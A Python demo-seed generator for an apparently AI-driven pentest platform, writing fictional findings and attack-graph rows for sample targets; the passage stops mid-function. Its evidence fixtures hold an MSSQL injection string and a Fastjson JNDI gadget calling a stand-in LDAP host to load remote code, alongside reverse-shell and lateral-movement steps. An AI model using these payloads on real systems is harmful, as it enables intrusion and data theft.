#!/usr/bin/env python3
"""
ARTEX local demo seed generator (deterministic, repeatable, offline).

What it does
------------
1. Writes content-addressed HTTP evidence blobs (request/response bodies) into the
   evidence store so finding "traffic receipts" render their bodies, not just headers.
   Blob path = <evidence-dir>/blobs/<sha256[:2]>/<sha256>.bin  (matches evidence/store.go).
2. Emits a single idempotent SQL script (to stdout) that populates every core entity:
     - Asset graph .......... companies, company_scope, assets (all 6 types), task_asset_links
     - Exploration graph .... explorations, exploration_nodes (begin/goal/intent/fact/
                              finding/hint/digest), exploration_edges (spawns/derived_from/
                              yields/proves/covers), exploration_anchors, task_constraints,
                              coverage_ledger, activity (tool-call timeline)
     - Evidence/receipts .... findings, traffic_evidence_snapshots, finding_traffic_bindings,
                              finding_retests
     - Governance/lifecycle . task_scope (in-scope), task_constraints (deny=out-of-scope),
                              intercept_rules, intercept_pending (approval gates),
                              target_pins, task budgets/status, llm_profiles
   All demo rows use ids >= 9000 (DEMO_BASE) or the 'demo-' id prefix, so the seed only ever
   touches its own rows and never clobbers auth/password or user-created config.

Usage
-----
    python3 seed_demo.py                 # write blobs to ./data/evidence, print SQL
    ARTEX_EVIDENCE_DIR=/path python3 seed_demo.py > seed_demo.sql
    (the seed.sh wrapper pipes the SQL into the postgres container)

It is deterministic: same input -> same hashes, ids, timestamps -> same DB every run.
"""

import hashlib
import os
import sys

DEMO_BASE = 9000
EVIDENCE_DIR = os.environ.get("ARTEX_EVIDENCE_DIR", os.path.join("data", "evidence"))


# ---------------------------------------------------------------------------
# Evidence blobs: realistic request/response pairs for three findings.
# ---------------------------------------------------------------------------
def write_blob(body: bytes) -> tuple[str, int]:
    h = hashlib.sha256(body).hexdigest()
    path = os.path.join(EVIDENCE_DIR, "blobs", h[:2], h + ".bin")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(body)
    try:
        os.chmod(path, 0o644)
    except OSError:
        pass
    return h, len(body)


def q(s: str) -> str:
    """Single-quote-escape for SQL string literals."""
    return s.replace("'", "''")


# Three evidence receipts. Each: (snap_id, url, method, status, ctype, req_head, req_body, resp_head, resp_body)
RECEIPTS = [
    (
        "demo-snap-sqli-req",
        "https://www.acme.com/search?q=1%27%20AND%201%3DCONVERT(int%2C%40%40version)--",
        "GET",
        500,
        "text/html; charset=utf-8",
        "GET /search?q=1' AND 1=CONVERT(int,@@version)-- HTTP/1.1\r\n"
        "Host: www.acme.com\r\nUser-Agent: ARTEX-worker/1.0\r\nAccept: text/html\r\n\r\n",
        b"",
        "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html; charset=utf-8\r\nServer: Microsoft-IIS/10.0\r\n\r\n",
        b"<html><head><title>Server Error</title></head><body>\n"
        b"System.Data.SqlClient.SqlException: Conversion failed when converting the "
        b"nvarchar value 'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5' to data type int.\n"
        b"  at Acme.Web.Search.Query(String q) in C:\\acme\\web\\Search.cs:line 88\n"
        b"</body></html>\n",
    ),
    (
        "demo-snap-idor",
        "https://api.acme.com/v1/orders?id=1002",
        "GET",
        200,
        "application/json",
        "GET /v1/orders?id=1002 HTTP/1.1\r\nHost: api.acme.com\r\n"
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.sig\r\n"
        "User-Agent: ARTEX-worker/1.0\r\n\r\n",
        b"",
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n",
        b'{"order_id":1002,"user_id":1002,"customer":"Dana Levin",'
        b'"email":"dana.levin@example.net","ship_to":"14 Harbour Rd, Haifa",'
        b'"phone":"+972-50-555-0142","total":"329.90","items":[{"sku":"AC-204","qty":2}]}\n',
    ),
    (
        "demo-snap-rce",
        "https://shop.acme.com/api/import",
        "POST",
        200,
        "application/json",
        "POST /api/import HTTP/1.1\r\nHost: shop.acme.com\r\nContent-Type: application/json\r\n"
        "User-Agent: ARTEX-worker/1.0\r\nContent-Length: 118\r\n\r\n",
        b'{"@type":"com.sun.rowset.JdbcRowSetImpl",'
        b'"dataSourceName":"ldap://10.8.0.5:1389/Exploit","autoCommit":true}',
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Powered-By: fastjson/1.2.24\r\n\r\n",
        b'{"status":"ok","imported":0}\n'
        b"# out-of-band: dmz-web01 resolved ldap://10.8.0.5:1389 and executed `id` -> "
        b"uid=33(www-data) gid=33(www-data)\n",
    ),
]

snap_rows = []
binding_rows = []
captured = 1763000000000  # fixed epoch ms, deterministic
for i, (sid, url, method, status, ctype, rhead, rbody, phead, pbody) in enumerate(
    RECEIPTS
):
    req_hash, req_len = write_blob(rbody)
    resp_hash, resp_len = write_blob(pbody)
    snap_rows.append(
        f"('{sid}','traffic-{sid}',{captured + i * 1000},'{q(url)}','{method}',{status},"
        f"'{q(ctype)}','{q(rhead)}','{q(phead)}','{req_hash}','{resp_hash}',{req_len},{resp_len})"
    )

# finding_id -> list of (snapshot_id, role, note, position)
BINDINGS = {
    9001: [
        (
            "demo-snap-sqli-req",
            "primary",
            "Error-based SQLi: MSSQL version leaked via CONVERT()",
            0,
        )
    ],
    9002: [
        ("demo-snap-idor", "primary", "IDOR: id=1002 returns another customer's PII", 0)
    ],
    9005: [
        (
            "demo-snap-rce",
            "primary",
            "Fastjson @type gadget triggers JNDI/LDAP callback -> RCE",
            0,
        )
    ],
}
for fid, lst in BINDINGS.items():
    for sid, role, note, pos in lst:
        binding_rows.append(f"({fid},'{sid}','{role}','{q(note)}',{pos})")

# ---------------------------------------------------------------------------
# SQL emission
# ---------------------------------------------------------------------------
SQL = []


def w(s=""):
    SQL.append(s)


w(
    "-- ARTEX demo seed (generated by scripts/demo/seed_demo.py). Deterministic & idempotent."
)
w("-- Only touches demo rows (id >= 9000 or 'demo-' prefix). Safe to re-run.")
w("BEGIN;")
w()
w("-- ============ 0. Clean prior demo rows (FK-safe order) ============")
w("DELETE FROM finding_traffic_bindings WHERE finding_id >= 9000;")
w("DELETE FROM traffic_evidence_snapshots WHERE id LIKE 'demo-%';")
w("DELETE FROM finding_retests WHERE id >= 9000;")
w("DELETE FROM findings WHERE id >= 9000;")
w("DELETE FROM coverage_ledger_history WHERE task_id >= 9000;")
w("DELETE FROM coverage_ledger WHERE task_id >= 9000;")
w("DELETE FROM activity WHERE exploration_id >= 9000;")
w("DELETE FROM task_constraints WHERE exploration_id >= 9000;")
w("DELETE FROM exploration_anchors WHERE node_id >= 9000;")
w("DELETE FROM exploration_edges WHERE exploration_id >= 9000;")
w("DELETE FROM task_scope WHERE task_id >= 9000;")
w("DELETE FROM task_asset_links WHERE task_id >= 9000;")
w("DELETE FROM intercept_pending WHERE id >= 9000;")
w("DELETE FROM intercept_rules WHERE id >= 9000;")
w("DELETE FROM target_pins WHERE id >= 9000;")
w("DELETE FROM tasks WHERE id >= 9000;")  # tasks before explorations (FK RESTRICT)
w("DELETE FROM exploration_nodes WHERE id >= 9000;")
w("DELETE FROM explorations WHERE id >= 9000;")
w("DELETE FROM company_scope WHERE company_id >= 9000;")
w("DELETE FROM assets WHERE id >= 9000;")
w("DELETE FROM companies WHERE id >= 9000;")
w("DELETE FROM finding_retests WHERE conversation_id >= 9000;")
w("DELETE FROM conversations WHERE id >= 9000;")
w("DELETE FROM llm_profiles WHERE id >= 9000;")
w()

w("-- ============ 1. LLM profiles (System -> LLM) ============")
w("-- Keyless demo profiles: the UI shows them configured; add real keys to run live.")
w("""INSERT INTO llm_profiles (id,name,format,base_url,model,api_key,api_key_hint,context_window_k,reasoning_effort,thinking_type,is_default,priority,streaming) VALUES
 (9001,'Demo Claude (Anthropic)','anthropic','https://api.anthropic.com','claude-opus-4-8','','sk-****demo',200,'medium','enabled',false,100,true),
 (9002,'Demo GPT (OpenAI)','openai','https://api.openai.com/v1','gpt-5','','sk-****demo',128,'','',false,90,true),
 (9003,'Demo Local (Ollama)','ollama','http://host.docker.internal:11434','llama3.1:70b','','',128,'','',false,50,true);""")
w()

w("-- ============ 2. Companies + organisation scope (Asset graph roots) ============")
w("""INSERT INTO companies (id,name,nkey,logo) VALUES
 (9001,'Acme Corp','acme-corp-demo',''),
 (9002,'Globex Retail','globex-retail-demo',''),
 (9003,'Acme Cloud Corp','acme-cloud-corp-demo','');""")
w("""INSERT INTO company_scope (company_id,kind,domain,net,value,raw,reason) VALUES
 (9001,'domain','acme.com',NULL,NULL,'acme.com','Primary production domain'),
 (9001,'cidr',NULL,'203.0.113.0/24',NULL,'203.0.113.0/24','DMZ edge range'),
 (9001,'ip',NULL,'198.51.100.20',NULL,'198.51.100.20','VPN concentrator'),
 (9001,'keyword',NULL,NULL,'acme','acme','Brand keyword'),
 (9002,'domain','globex.io',NULL,NULL,'globex.io','Storefront domain'),
 (9002,'cidr',NULL,'192.0.2.0/24',NULL,'192.0.2.0/24','Retail edge range'),
 (9003,'domain','acme.demo.local',NULL,NULL,'acme.demo.local','Cloud estate root domain'),
 (9003,'cidr',NULL,'198.51.100.0/24',NULL,'198.51.100.0/24','Cloud edge range');""")
w()

w("-- ============ 3. Explorations (one per task) ============")
w("""INSERT INTO explorations (id,description,goal,status,round_no) VALUES
 (9001,'External penetration of the Acme website and admin console','Gain admin access to acme.com and read user data','open',7),
 (9002,'Authorization-bypass and injection testing of api.acme.com','Bypass authz and prove data exposure on api.acme.com','open',5),
 (9003,'DMZ breakthrough and lateral movement to the internal domain','Break the DMZ and take internal DC01','achieved',12),
 (9004,'Globex storefront reconnaissance and surface mapping','Map globex.io attack surface','open',2),
 (9005,'Cloud external recon of acme.demo.local','Enumerate the acme.demo.local cloud attack surface','open',3),
 (9006,'Billing API authz & injection testing','Test the Customer Billing Portal API','open',4),
 (9007,'Partner Gateway security audit','Audit the Internal Partner Gateway','open',2);""")
w()

w(
    "-- ============ 4. Tasks (lifecycle: running / running / done / paused) ============"
)
w("-- t9001 has the target-approval gate ON and run budgets set (governance demo).")
w("""INSERT INTO tasks (id,name,description,goal,exploration_id,status,company_id,llm_profile_id,active_llm_profile_id,llm_rotate,target_gate,coverage_enabled,timeout_seconds,first_run_at,created_at) VALUES
 (9001,'Acme Web — external to admin','External penetration of the Acme website and admin console','Gain admin access to acme.com and read user data',9001,'running',9001,9001,9001,true,true,true,0,'2026-11-12T09:12:00Z','2026-11-12T09:10:00Z'),
 (9002,'Acme API — authz & injection','Authorization-bypass and injection testing of api.acme.com','Bypass authz and prove data exposure on api.acme.com',9002,'running',9001,9001,9002,true,false,true,0,'2026-11-14T02:20:00Z','2026-11-14T02:15:00Z'),
 (9003,'Acme DMZ → internal','DMZ breakthrough and lateral movement to the internal domain','Break the DMZ and take internal DC01',9003,'done',9001,9001,9001,false,false,true,0,'2026-11-13T14:10:00Z','2026-11-13T14:00:00Z'),
 (9004,'Globex storefront recon','Globex storefront reconnaissance and surface mapping','Map globex.io attack surface',9004,'paused',9002,9002,9002,false,false,true,0,'2026-11-20T08:00:00Z','2026-11-20T07:55:00Z'),
 (9005,'Cloud external recon','Cloud external recon of acme.demo.local','Enumerate the acme.demo.local cloud attack surface',9005,'done',9003,9001,9001,false,false,true,0,'2026-11-21T09:00:00Z','2026-11-21T08:55:00Z'),
 (9006,'Billing API test','Billing API authz & injection testing','Test the Customer Billing Portal API',9006,'running',9003,9001,9001,false,false,true,0,'2026-11-22T10:00:00Z','2026-11-22T09:55:00Z'),
 (9007,'Partner Gateway audit','Partner Gateway security audit','Audit the Internal Partner Gateway',9007,'done',9003,9001,9001,false,false,true,0,'2026-11-22T14:00:00Z','2026-11-22T13:55:00Z');""")
w("UPDATE tasks SET completed_at='2026-11-14T00:30:00Z', status='done' WHERE id=9003;")
w("UPDATE tasks SET paused=true, paused_at='2026-11-20T09:00:00Z' WHERE id=9004;")
w("UPDATE tasks SET deadline_at='2026-11-27T09:12:00Z' WHERE id=9001;")
w()

w(
    "-- ============ 5. Assets (all 6 types, with parent/child hierarchy + dedup keys) ============"
)


# type, company, task_ids, cols dict
def asset(id, type_, tids, company=None, **k):
    comp = str(company) if company is not None else ("9001" if id < 9014 else "9002")
    cols = ["id", "type", "company_id", "company_source", "task_ids"]
    vals = [
        str(id),
        f"'{type_}'",
        comp,
        "'explicit'",
        "ARRAY[" + ",".join(str(t) for t in tids) + "]::bigint[]",
    ]
    for key, val in k.items():
        cols.append(key)
        vals.append(val)
    return f"INSERT INTO assets ({','.join(cols)}) VALUES ({','.join(vals)});"


OP = lambda *p: "ARRAY[" + ",".join("'" + x + "'::jsonb" for x in p) + "]::jsonb[]"
w(
    asset(
        9001,
        "root_domain",
        [9001],
        domain="'acme.com'",
        root_domain="'acme.com'",
        icp="'ICP-2021-ACME'",
        record_type="'A'",
        record_value="ARRAY['203.0.113.10']",
        last_seen="'2026-11-14T02:00:00Z'",
    )
)
w(
    asset(
        9002,
        "subdomain",
        [9001],
        domain="'www.acme.com'",
        root_domain="'acme.com'",
        record_type="'A'",
        record_value="ARRAY['203.0.113.10']",
        last_seen="'2026-11-14T02:01:00Z'",
    )
)
w(
    asset(
        9003,
        "subdomain",
        [9002],
        domain="'api.acme.com'",
        root_domain="'acme.com'",
        record_type="'A'",
        record_value="ARRAY['203.0.113.11']",
        last_seen="'2026-11-14T02:02:00Z'",
    )
)
w(
    asset(
        9004,
        "subdomain",
        [9003],
        domain="'shop.acme.com'",
        root_domain="'acme.com'",
        record_type="'A'",
        record_value="ARRAY['203.0.113.12']",
        last_seen="'2026-11-13T15:00:00Z'",
    )
)
w(
    asset(
        9005,
        "subdomain",
        [9001],
        domain="'admin.acme.com'",
        root_domain="'acme.com'",
        record_type="'A'",
        record_value="ARRAY['203.0.113.10']",
        last_seen="'2026-11-14T03:40:00Z'",
    )
)
w(
    asset(
        9006,
        "ip",
        [9001, 9002],
        ip="'203.0.113.10'",
        c_segment="'203.0.113.0/24'",
        bound_domains="ARRAY['www.acme.com','admin.acme.com','acme.com']",
        open_ports=OP(
            '{"port":80,"service":"http"}',
            '{"port":443,"service":"https"}',
            '{"port":22,"service":"ssh"}',
        ),
        last_seen="'2026-11-14T02:05:00Z'",
    )
)
w(
    asset(
        9007,
        "ip",
        [9002],
        ip="'203.0.113.11'",
        c_segment="'203.0.113.0/24'",
        bound_domains="ARRAY['api.acme.com']",
        open_ports=OP('{"port":443,"service":"https"}'),
        last_seen="'2026-11-14T02:06:00Z'",
    )
)
w(
    asset(
        9008,
        "ip",
        [9003],
        ip="'203.0.113.12'",
        c_segment="'203.0.113.0/24'",
        bound_domains="ARRAY['shop.acme.com']",
        open_ports=OP(
            '{"port":443,"service":"https"}', '{"port":8080,"service":"http"}'
        ),
        last_seen="'2026-11-13T15:00:00Z'",
    )
)
w(
    asset(
        9009,
        "service",
        [9001],
        url="'https://www.acme.com'",
        service_type="'http'",
        service_name="'nginx'",
        status_code="200",
        content_length="5120",
        page_title="'Acme Corp — Home'",
        technologies="ARRAY['nginx','ASP.NET','MSSQL']",
        last_seen="'2026-11-14T02:08:00Z'",
    )
)
w(
    asset(
        9010,
        "service",
        [9002],
        url="'https://api.acme.com'",
        service_type="'http'",
        service_name="'kong'",
        status_code="200",
        content_length="256",
        page_title="''",
        technologies="ARRAY['Kong','JWT','PostgreSQL']",
        last_seen="'2026-11-14T02:09:00Z'",
    )
)
w(
    asset(
        9011,
        "service",
        [9003],
        domain="'shop.acme.com'",
        ip="'203.0.113.12'",
        port="8080",
        service_type="'other'",
        service_name="'fastjson-import'",
        last_seen="'2026-11-13T15:05:00Z'",
    )
)
w(
    asset(
        9012,
        "endpoint",
        [9001],
        url="'https://www.acme.com/search'",
        method="'GET'",
        params=OP('{"name":"q","in":"query","type":"string"}'),
        last_seen="'2026-11-14T01:20:00Z'",
    )
)
w(
    asset(
        9013,
        "endpoint",
        [9002],
        url="'https://api.acme.com/v1/orders'",
        method="'GET'",
        params=OP('{"name":"id","in":"query","type":"int"}'),
        last_seen="'2026-11-14T02:44:00Z'",
    )
)
w(
    asset(
        9014,
        "app",
        [9001],
        app_name="'Acme Mobile'",
        bundle_id="'com.acme.app'",
        category="'Shopping'",
        app_description="'Acme official shopping app'",
        last_seen="'2026-11-10T10:00:00Z'",
    )
)
# Globex (company 9002)
w(
    asset(
        9015,
        "root_domain",
        [9004],
        domain="'globex.io'",
        root_domain="'globex.io'",
        record_type="'A'",
        record_value="ARRAY['192.0.2.50']",
        last_seen="'2026-11-20T08:10:00Z'",
    )
)
w(
    asset(
        9016,
        "subdomain",
        [9004],
        domain="'store.globex.io'",
        root_domain="'globex.io'",
        record_type="'A'",
        record_value="ARRAY['192.0.2.50']",
        last_seen="'2026-11-20T08:11:00Z'",
    )
)
w(
    asset(
        9017,
        "ip",
        [9004],
        ip="'192.0.2.50'",
        c_segment="'192.0.2.0/24'",
        bound_domains="ARRAY['globex.io','store.globex.io']",
        open_ports=OP('{"port":443,"service":"https"}'),
        last_seen="'2026-11-20T08:12:00Z'",
    )
)
w(
    asset(
        9018,
        "service",
        [9004],
        url="'https://store.globex.io'",
        service_type="'http'",
        service_name="'cloudflare'",
        status_code="200",
        content_length="8192",
        page_title="'Globex Store'",
        technologies="ARRAY['Cloudflare','React','Node.js']",
        last_seen="'2026-11-20T08:13:00Z'",
    )
)
w()

w("-- ---- Use Case 1 demo: Acme Cloud Corp (acme.demo.local) canonical hierarchy ----")
w(
    "-- Overlapping observations from 3 discovery/test tasks (9005/9006/9007) resolve into"
)
w("-- single canonical nodes via deterministic dedup keys; task_ids record the merges.")
w(
    asset(
        9201,
        "root_domain",
        [9005, 9006, 9007],
        company=9003,
        domain="'acme.demo.local'",
        root_domain="'acme.demo.local'",
        record_type="'A'",
        record_value="ARRAY['198.51.100.14']",
        last_seen="'2026-11-22T10:00:00Z'",
    )
)
w(
    asset(
        9202,
        "subdomain",
        [9005, 9006],
        company=9003,
        domain="'api.acme.demo.local'",
        root_domain="'acme.demo.local'",
        record_type="'A'",
        record_value="ARRAY['198.51.100.14']",
        last_seen="'2026-11-22T10:01:00Z'",
    )
)
w(
    asset(
        9203,
        "subdomain",
        [9005, 9007],
        company=9003,
        domain="'portal.acme.demo.local'",
        root_domain="'acme.demo.local'",
        record_type="'A'",
        record_value="ARRAY['198.51.100.22']",
        last_seen="'2026-11-22T10:02:00Z'",
    )
)
w(
    asset(
        9204,
        "subdomain",
        [9005],
        company=9003,
        domain="'admin-staging.acme.demo.local'",
        root_domain="'acme.demo.local'",
        record_type="'A'",
        record_value="ARRAY['198.51.100.22']",
        last_seen="'2026-11-21T09:10:00Z'",
    )
)
w(
    asset(
        9205,
        "ip",
        [9005, 9006, 9007],
        company=9003,
        ip="'198.51.100.14'",
        c_segment="'198.51.100.0/24'",
        bound_domains="ARRAY['acme.demo.local','api.acme.demo.local']",
        open_ports=OP('{"port":443,"service":"https"}'),
        last_seen="'2026-11-22T10:03:00Z'",
    )
)
w(
    asset(
        9206,
        "ip",
        [9005, 9007],
        company=9003,
        ip="'198.51.100.22'",
        c_segment="'198.51.100.0/24'",
        bound_domains="ARRAY['portal.acme.demo.local','admin-staging.acme.demo.local']",
        open_ports=OP(
            '{"port":443,"service":"https"}', '{"port":8443,"service":"admin-api"}'
        ),
        last_seen="'2026-11-22T10:04:00Z'",
    )
)
w(
    asset(
        9207,
        "service",
        [9005, 9006],
        company=9003,
        url="'https://api.acme.demo.local'",
        service_type="'http'",
        service_name="'nginx'",
        status_code="200",
        content_length="2048",
        page_title="'Acme Cloud API'",
        technologies="ARRAY['nginx','OpenAPI','PostgreSQL']",
        last_seen="'2026-11-22T10:05:00Z'",
    )
)
w(
    asset(
        9208,
        "service",
        [9005, 9007],
        company=9003,
        domain="'portal.acme.demo.local'",
        ip="'198.51.100.22'",
        port="8443",
        service_type="'other'",
        service_name="'admin-api'",
        last_seen="'2026-11-22T10:06:00Z'",
    )
)
w(
    asset(
        9209,
        "app",
        [9006],
        company=9003,
        app_name="'Customer Billing Portal'",
        bundle_id="'com.acme.billing'",
        category="'Finance'",
        app_description="'Customer invoice & billing portal'",
        last_seen="'2026-11-22T10:07:00Z'",
    )
)
w(
    asset(
        9213,
        "app",
        [9007],
        company=9003,
        app_name="'Internal Partner Gateway'",
        bundle_id="'com.acme.partner'",
        category="'B2B'",
        app_description="'Partner integration gateway'",
        last_seen="'2026-11-22T14:10:00Z'",
    )
)
# 9210 — the dedup showcase endpoint: observed by all 3 tasks, enriched with lineage fields.
w(
    asset(
        9210,
        "endpoint",
        [9005, 9006, 9007],
        company=9003,
        url="'https://api.acme.demo.local/api/v2/invoices/{id}'",
        method="'GET'",
        root_domain="'acme.demo.local'",
        domain="'api.acme.demo.local'",
        ip="'198.51.100.14'",
        app_name="'Customer Billing Portal'",
        params=OP('{"name":"id","in":"path","type":"int"}'),
        last_seen="'2026-11-22T10:08:00Z'",
    )
)
w(
    asset(
        9211,
        "endpoint",
        [9006],
        company=9003,
        url="'https://api.acme.demo.local/api/v2/auth/token'",
        method="'POST'",
        root_domain="'acme.demo.local'",
        domain="'api.acme.demo.local'",
        ip="'198.51.100.14'",
        last_seen="'2026-11-22T10:09:00Z'",
    )
)
w(
    asset(
        9212,
        "endpoint",
        [9007],
        company=9003,
        url="'https://portal.acme.demo.local/internal/export'",
        method="'GET'",
        root_domain="'acme.demo.local'",
        domain="'portal.acme.demo.local'",
        ip="'198.51.100.22'",
        last_seen="'2026-11-22T14:11:00Z'",
    )
)
w()

w(
    "-- ============ 6. Exploration graph nodes (begin/goal/intent/fact/finding/hint/digest) ============"
)


# node(id, exploration_id, kind, payload_json, priority, state, origin, created_at, completed_at)
def node(id, exp, kind, payload, pr, state, origin, ts, done=None):
    comp = f"'{done}'" if done else "NULL"
    return (
        f"INSERT INTO exploration_nodes (id,exploration_id,kind,payload,priority,state,origin,created_at,completed_at) "
        f"VALUES ({id},{exp},'{kind}','{q(payload)}'::jsonb,{pr},'{state}','{origin}','{ts}',{comp});"
    )


# Exploration 9001 (Acme Web) — the showcase graph
w(
    node(
        9101,
        9001,
        "begin",
        '{"summary":"Origin: acme.com external \\u2192 admin assessment"}',
        0,
        "open",
        "system",
        "2026-11-12T09:12:00Z",
    )
)
w(
    node(
        9102,
        9001,
        "goal",
        '{"text":"Gain admin access to acme.com","vulnclass":"Access Control"}',
        9,
        "met",
        "goals",
        "2026-11-12T09:13:00Z",
        "2026-11-14T03:50:00Z",
    )
)
w(
    node(
        9103,
        9001,
        "goal",
        '{"text":"Read user sensitive data","vulnclass":"Sensitive Data Exposure"}',
        8,
        "open",
        "goals",
        "2026-11-12T09:13:00Z",
    )
)
w(
    node(
        9104,
        9001,
        "intent",
        '{"summary":"acme.com subdomain enumeration and port scanning"}',
        6,
        "done",
        "planner",
        "2026-11-12T09:20:00Z",
        "2026-11-12T10:05:00Z",
    )
)
w(
    node(
        9105,
        9001,
        "intent",
        '{"summary":"Admin console default / weak credential testing"}',
        9,
        "done",
        "planner",
        "2026-11-14T03:30:00Z",
        "2026-11-14T03:50:00Z",
    )
)
w(
    node(
        9106,
        9001,
        "intent",
        '{"summary":"Enumerate admin console features and user-data APIs"}',
        8,
        "running",
        "planner",
        "2026-11-14T03:55:00Z",
    )
)
w(
    node(
        9107,
        9001,
        "intent",
        '{"summary":"SQL injection probing on www.acme.com/search"}',
        8,
        "done",
        "planner",
        "2026-11-13T22:00:00Z",
        "2026-11-14T01:20:00Z",
    )
)
w(
    node(
        9108,
        9001,
        "intent",
        '{"summary":"Exposed .git source leak and credential extraction"}',
        7,
        "done",
        "planner",
        "2026-11-13T20:00:00Z",
        "2026-11-13T20:30:00Z",
    )
)
w(
    node(
        9109,
        9001,
        "intent",
        '{"summary":"Reflected XSS fuzzing on the search result title"}',
        5,
        "paused",
        "planner",
        "2026-11-13T22:05:00Z",
    )
)
w(
    node(
        9110,
        9001,
        "intent",
        '{"summary":"Credential brute-force on the VPN portal"}',
        4,
        "blocked",
        "planner",
        "2026-11-13T23:00:00Z",
    )
)
w(
    node(
        9111,
        9001,
        "fact",
        '{"summary":"www.acme.com/search q= parameter reflects an MSSQL error (injectable)","confidence":"high","source":"worker","provenance":"error-based probe"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T01:15:00Z",
    )
)
w(
    node(
        9112,
        9001,
        "fact",
        '{"summary":"admin.acme.com accepts admin/admin123 (default credentials)","confidence":"high","source":"worker"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T03:48:00Z",
    )
)
w(
    node(
        9113,
        9001,
        "fact",
        '{"summary":"www.acme.com exposes /.git (HTTP 200 on /.git/HEAD)","confidence":"high","source":"worker"}',
        0,
        "confirmed",
        "worker",
        "2026-11-13T20:25:00Z",
    )
)
w(
    node(
        9114,
        9001,
        "fact",
        '{"summary":"WAF suspected on /login (rate-limit 429 after 5 tries) \\u2014 later disproved","confidence":"low"}',
        0,
        "dismissed",
        "worker",
        "2026-11-13T23:10:00Z",
    )
)
w(
    node(
        9115,
        9001,
        "finding",
        '{"summary":"[High] Error-based SQL injection on www.acme.com/search?q="}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T01:20:00Z",
    )
)
w(
    node(
        9116,
        9001,
        "finding",
        '{"summary":"[High] Default credentials on admin.acme.com console"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T03:50:00Z",
    )
)
w(
    node(
        9117,
        9001,
        "finding",
        '{"summary":"[Medium] Exposed .git directory discloses source"}',
        0,
        "confirmed",
        "worker",
        "2026-11-13T20:30:00Z",
    )
)
w(
    node(
        9118,
        9001,
        "hint",
        '{"summary":"Recovered DB connection string in leaked source \\u2192 try credential reuse on admin"}',
        0,
        "consumed",
        "worker",
        "2026-11-13T20:32:00Z",
    )
)
w(
    node(
        9119,
        9001,
        "hint",
        '{"summary":"Admin console exposes /api/users \\u2014 enumerate for the data-read goal"}',
        0,
        "active",
        "planner",
        "2026-11-14T03:52:00Z",
    )
)
w(
    node(
        9120,
        9001,
        "digest",
        '{"summary":"External recon complete: 5 hosts, 3 confirmed findings, admin foothold achieved"}',
        0,
        "active",
        "planner",
        "2026-11-14T03:55:00Z",
    )
)

# Exploration 9002 (Acme API)
w(
    node(
        9130,
        9002,
        "begin",
        '{"summary":"Origin: api.acme.com authz & injection"}',
        0,
        "open",
        "system",
        "2026-11-14T02:20:00Z",
    )
)
w(
    node(
        9131,
        9002,
        "goal",
        '{"text":"Prove broken object-level authorization on api.acme.com","vulnclass":"IDOR"}',
        9,
        "met",
        "goals",
        "2026-11-14T02:21:00Z",
        "2026-11-14T02:44:00Z",
    )
)
w(
    node(
        9132,
        9002,
        "intent",
        '{"summary":"IDOR testing on the /v1/orders endpoint"}',
        8,
        "running",
        "planner",
        "2026-11-14T02:30:00Z",
    )
)
w(
    node(
        9133,
        9002,
        "intent",
        '{"summary":"Offline JWT key cracking from a captured token"}',
        7,
        "done",
        "planner",
        "2026-11-14T02:50:00Z",
        "2026-11-14T03:02:00Z",
    )
)
w(
    node(
        9134,
        9002,
        "fact",
        '{"summary":"/v1/orders?id= has no ownership check; id=1002 returns another user","confidence":"high","source":"worker"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T02:43:00Z",
    )
)
w(
    node(
        9135,
        9002,
        "finding",
        '{"summary":"[High] IDOR on api.acme.com/v1/orders"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T02:44:00Z",
    )
)
w(
    node(
        9136,
        9002,
        "finding",
        '{"summary":"[High] Weak HS256 JWT key (\\u0027secret\\u0027) allows token forgery"}',
        0,
        "confirmed",
        "worker",
        "2026-11-14T03:02:00Z",
    )
)

# Exploration 9003 (DMZ -> internal, achieved)
w(
    node(
        9150,
        9003,
        "begin",
        '{"summary":"Origin: DMZ breakthrough to internal DC01"}',
        0,
        "open",
        "system",
        "2026-11-13T14:10:00Z",
    )
)
w(
    node(
        9151,
        9003,
        "goal",
        '{"text":"Break the DMZ and take internal DC01","vulnclass":"RCE"}',
        10,
        "met",
        "goals",
        "2026-11-13T14:11:00Z",
        "2026-11-14T00:30:00Z",
    )
)
w(
    node(
        9152,
        9003,
        "intent",
        '{"summary":"shop.acme.com component fingerprinting and CVE correlation"}',
        7,
        "done",
        "planner",
        "2026-11-13T14:20:00Z",
        "2026-11-13T15:00:00Z",
    )
)
w(
    node(
        9153,
        9003,
        "intent",
        '{"summary":"Trigger the Fastjson deserialization RCE for a reverse shell"}',
        9,
        "done",
        "planner",
        "2026-11-13T15:10:00Z",
        "2026-11-13T16:00:00Z",
    )
)
w(
    node(
        9154,
        9003,
        "intent",
        '{"summary":"Lateral movement to internal DC01 via credential reuse"}',
        10,
        "done",
        "planner",
        "2026-11-13T20:30:00Z",
        "2026-11-14T00:30:00Z",
    )
)
w(
    node(
        9155,
        9003,
        "intent",
        '{"summary":"Kerberoast domain service accounts (exhausted the candidate list)"}',
        6,
        "exhausted",
        "planner",
        "2026-11-13T22:40:00Z",
        "2026-11-13T23:30:00Z",
    )
)
w(
    node(
        9156,
        9003,
        "intent",
        '{"summary":"Abandoned: SMB relay attempt (signing enforced)"}',
        3,
        "stopped",
        "planner",
        "2026-11-13T21:00:00Z",
    )
)
w(
    node(
        9157,
        9003,
        "fact",
        '{"summary":"shop.acme.com runs Fastjson 1.2.24 without safeMode (RCE-prone)","confidence":"high","source":"worker"}',
        0,
        "confirmed",
        "worker",
        "2026-11-13T14:55:00Z",
    )
)
w(
    node(
        9158,
        9003,
        "finding",
        '{"summary":"[Critical] Fastjson deserialization RCE on shop.acme.com/api/import"}',
        0,
        "confirmed",
        "worker",
        "2026-11-13T16:00:00Z",
    )
)
w(
    node(
        9159,
        9003,
        "hint",
        '{"summary":"www-data can read /opt/app/.env \\u2014 internal DB creds for lateral reuse"}',
        0,
        "consumed",
        "worker",
        "2026-11-13T16:10:00Z",
    )
)
w(
    node(
        9160,
        9003,
